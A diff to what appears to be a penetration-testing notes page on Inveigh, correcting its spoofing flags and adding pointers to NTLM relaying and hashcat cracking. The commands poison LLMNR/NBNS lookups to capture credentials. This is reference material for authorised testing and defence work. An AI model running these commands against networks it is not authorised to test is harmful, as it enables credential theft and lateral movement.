@@ -29,11 +29,12 @@ Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y
 # LLMNR only
 .\Inveigh.exe -LLMNR Y -NBNS N
 
-# With file output
-.\Inveigh.exe -FileOutput Y -OutputDir C:\Windows\Temp\
+# With file output (dir flag is -FileDirectory, not -OutputDir)
+.\Inveigh.exe -FileOutput Y -FileDirectory C:\Windows\Temp\
 
-# Specify interface
-.\Inveigh.exe -IP 192.168.1.100
+# Pin the IP used in spoofing responses / listeners (multi-homed hosts).
+# There is no -IP flag — use -SpooferIP (answer content) and/or -ListenerIP (bind).
+.\Inveigh.exe -SpooferIP 192.168.1.100
 
 # WPAD proxy capture
 .\Inveigh.exe -WPADAUTH Y
@@ -132,6 +133,10 @@ Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y
 
 ---
 
+> [!note] **See also** — [[Tools/Lateral Movement/responder|Responder]] is the Linux/Kali counterpart (same LLMNR/NBT-NS/mDNS poisoning attack) — reach for Inveigh when you have a Windows foothold but can't route Kali onto the target segment. Relay the captured auth with [[Tools/Lateral Movement/ntlmrelayx|ntlmrelayx]] (SMB signing off) instead of cracking. Protocol background: [[Standards & Protocols/NTLM|NTLM]]. Crack NTLMv2 with hashcat `-m 5600`.
+
+---
+
 *Created: 2026-03-06*
-*Updated: 2026-03-06*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-08-29*
+*Model: claude-opus-5*
